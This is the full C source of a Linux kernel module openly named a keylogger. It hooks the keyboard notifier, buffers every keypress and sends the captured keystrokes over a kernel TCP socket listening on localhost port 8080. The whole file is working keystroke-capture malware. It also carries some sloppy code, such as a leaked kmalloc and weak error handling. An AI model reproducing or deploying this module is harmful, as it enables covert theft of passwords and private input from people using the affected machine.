#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h> 
#include<linux/in.h>  
#include<linux/inet.h>  
#include<linux/socket.h>  
#include<net/sock.h>  

#define BUFFSIZE 32

MODULE_LICENSE("GPL");

//static char *sendbuf;  
static struct kvec vec;  
static struct msghdr msg;  
static struct socket *sock,*client_sock;  
static struct sockaddr_in s_addr;  
static unsigned short portnum=8080; 
static struct input_dev *input_dev;
static char buffer[BUFFSIZE];
static unsigned char buffer_index;

static void stop_server(void){

    printk("release socket now\n");
    sock_release(client_sock);  
    sock_release(sock);  

}

static int start_server(void){

    int ret;

    memset(&s_addr,0,sizeof(s_addr));  
    s_addr.sin_family=AF_INET;  
    s_addr.sin_port=htons(portnum);  
    s_addr.sin_addr.s_addr=in_aton("127.0.0.1");  


    sock=(struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL);  

    /*create a socket*/  
    ret=sock_create_kern(&init_net, AF_INET,SOCK_STREAM, IPPROTO_TCP,&sock);  
    if(ret){  
            printk("server:socket_create error!\n");  
    }  
    printk("server:socket_create ok!\n");  

    /*bind the socket*/  
    ret=kernel_bind(sock,(struct sockaddr *)&s_addr,sizeof(struct sockaddr_in));  
    if(ret<0){  
            stop_server();  
            return ret;  
    }  
    printk("server:bind ok!\n");  

    /*listen*/  
    ret=kernel_listen(sock,10);  
    if(ret<0){  
            printk("server: listen error\n");  
            return ret;  
    }  
    printk("server:listen ok!\n");  

    ret=kernel_accept(sock,&client_sock,10);
    if(ret<0){  
            printk("server:accept error!\n");  
            return ret;  
    }  

    printk("server: accept ok, Connection Established\n");  

    return 0;

}

static int send_msg(void)
{  
    int ret=0;  

    /*send message to client*/  
    memset(&vec,0,sizeof(vec));  
    memset(&msg,0,sizeof(msg));
    vec.iov_base=buffer;  
    vec.iov_len=BUFFSIZE;  
    msg.msg_name = 0;
    msg.msg_namelen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags=MSG_NOSIGNAL;
    //msleep(1000);

    ret=kernel_sendmsg(client_sock,&msg,&vec,1,BUFFSIZE); 
    //sendbuf[BUFFSIZE-1] = 0;

    return !(ret == BUFFSIZE);  
}  

static int keylogger_notify(struct notifier_block *self, unsigned long event, void *data) {
    struct keyboard_notifier_param *param = data;

    if (event == KBD_KEYSYM && param->down) {
        input_report_key(input_dev, param->value, 1); // Tecla pressionada
        input_sync(input_dev);

        buffer[buffer_index++] = param->value;

        if(buffer_index == BUFFSIZE-1){
            buffer[buffer_index] = '\0';
            send_msg();
            buffer_index = 0;
            memset(buffer, 0, BUFFSIZE);
        }
        
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_blk = {
    .notifier_call = keylogger_notify
};

static int start_keylogger(void){

    buffer_index = 0;

    input_dev = input_allocate_device();
    if (!input_dev) {
        return -ENOMEM;
    }

    input_dev->name = "keylogger";
    set_bit(EV_KEY, input_dev->evbit);
    set_bit(KEY_RESERVED, input_dev->keybit); // Todas as teclas são consideradas reservadas

    if (input_register_device(input_dev)) {
        input_free_device(input_dev);
        return -ENOMEM;
    }

    return 0;
    
}

static void stop_keylogger(void){

    unregister_keyboard_notifier(&keylogger_blk);
    input_unregister_device(input_dev);

}

static int __init keylogger_init(void) {
    
    if(start_keylogger()){
        return -ENOMEM;
    }

    register_keyboard_notifier(&keylogger_blk);

    pr_info("Módulo Keylogger carregado\n");

    if(start_server())
        return -ENOMEM;

    return 0;
}

static void __exit keylogger_exit(void) {

    stop_keylogger();
    stop_server();
    pr_info("Módulo Keylogger descarregado\n");

}

module_init(keylogger_init);
module_exit(keylogger_exit);
